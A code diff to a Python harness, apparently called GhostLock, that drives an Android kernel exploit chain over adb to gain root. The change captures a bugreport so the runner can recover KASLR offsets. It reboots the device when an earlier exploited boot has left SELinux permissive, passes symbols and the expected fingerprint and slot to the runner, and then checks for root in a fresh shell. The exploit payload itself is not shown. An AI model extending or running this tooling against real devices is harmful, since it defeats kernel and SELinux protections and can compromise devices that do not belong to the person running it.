@@ -10,6 +10,8 @@ import re
 import shutil
 import subprocess
 import sys
+import tempfile
+import time
 from dataclasses import dataclass
 from datetime import datetime, timezone
 from pathlib import Path
@@ -515,40 +517,68 @@ def build_runner_argv(
     serial: str,
     profile: TargetProfile,
     payload_sha256: str,
+    bugreport: Path,
     output_dir: Path,
-    min_battery: int,
-    retain_bugreport: bool,
 ) -> list[str]:
-    command = [
+    symbols = Path(profile.symbols_path)
+    slot = info_slot(serial)
+    return [
         sys.executable,
         str(RUNNER),
-        "--serial",
-        serial,
-        "--profile-id",
-        profile.profile_id,
-        "--profile-sha256",
-        profile.manifest_sha256,
-        "--payload-sha256",
-        payload_sha256,
-        "--remote-payload",
-        REMOTE_PAYLOAD,
-        "--remote-su",
-        REMOTE_SU,
-        "--min-battery",
-        str(min_battery),
-        "--output-dir",
-        str(output_dir),
+        "--serial", serial,
+        "--expected-fingerprint", profile.fingerprint,
+        "--expected-slot", slot,
+        "--symbols", str(symbols),
+        "--bugreport", str(bugreport),
+        "--payload-sha256", payload_sha256,
+        "--remote-payload", REMOTE_PAYLOAD,
+        "--remote-su", REMOTE_SU,
+        "--output-dir", str(output_dir),
         "--execute",
     ]
-    if retain_bugreport:
-        command.append("--retain-bugreport")
-    return command
+
+
+def info_slot(serial: str) -> str:
+    slot = shell_value(serial, "getprop ro.boot.slot_suffix")
+    return slot or "_a"
+
+
+def capture_bugreport(serial: str, dest: Path) -> None:
+    print(f"Capturing a fresh bugreport for KASLR recovery (this takes a minute) …")
+    result = adb(serial, "bugreport", str(dest), timeout=420, check=False)
+    if not dest.is_file() or dest.stat().st_size == 0:
+        raise GhostLockError(f"bugreport capture failed: {result.stdout.strip()[:200]}")
+
+
+def wait_for_device(serial: str, seconds: int = 180) -> None:
+    deadline = time.time() + seconds
+    while time.time() < deadline:
+        if adb_device_state(serial) == "device":
+            return
+        time.sleep(5)
+    raise GhostLockError(f"device {serial} did not return to the adb 'device' state")
+
+
+def adb_device_state(serial: str) -> str:
+    result = adb(serial, "get-state", check=False)
+    return result.stdout.strip()
 
 
 def command_run(args: argparse.Namespace) -> int:
     profiles = load_profiles(PROFILES_ROOT)
     serial = select_serial(args.serial)
     info = inspect_device(serial)
+
+    # A previous exploited boot leaves SELinux permissive.  The exploit
+    # requires Enforcing at entry, so reboot into a clean state instead of
+    # making the user do it by hand.
+    if info.selinux == "Permissive":
+        print("SELinux is Permissive from a previous run; rebooting for a clean state …")
+        adb(serial, "reboot")
+        wait_for_device(serial)
+        time.sleep(20)
+        info = inspect_device(serial)
+
     selected, mismatches = evaluate_device(info, profiles)
     print_device(info, selected, mismatches, reveal_serial=True)
     profile = require_target(info, profiles, min_battery=args.min_battery)
@@ -563,21 +593,33 @@ def command_run(args: argparse.Namespace) -> int:
     push_payload(serial, payload, digest)
 
     output = evidence_path(args.output_dir)
+    bugreport_parent = Path(tempfile.mkdtemp(prefix="ghostlock-br-"))
+    bugreport = bugreport_parent / "bugreport.zip"
+    capture_bugreport(serial, bugreport)
+
+    started = time.time()
     command = build_runner_argv(
         serial=serial,
         profile=profile,
         payload_sha256=digest,
+        bugreport=bugreport,
         output_dir=output,
-        min_battery=args.min_battery,
-        retain_bugreport=args.retain_bugreport,
     )
     print(f"Private log: {output}")
-    print("Starting guarded exploit chain; this usually takes several minutes …")
+    print("Starting guarded exploit chain …")
     result = subprocess.run(command, cwd=ROOT, check=False)
+    elapsed = int(time.time() - started)
+
+    if args.retain_bugreport and bugreport.is_file():
+        shutil.copy(bugreport, output / "bugreport.zip")
+    shutil.rmtree(bugreport_parent, ignore_errors=True)
+    if not args.retain_bugreport:
+        pass
     if result.returncode != 0:
         raise GhostLockError(
             f"runner failed closed with exit {result.returncode}; inspect {output}"
         )
+    print(f"\nChain completed in {elapsed}s.")
     print("\nIndependent fresh-shell verification:")
     if not verify_root(serial):
         raise GhostLockError("runner completed but independent root verification failed")
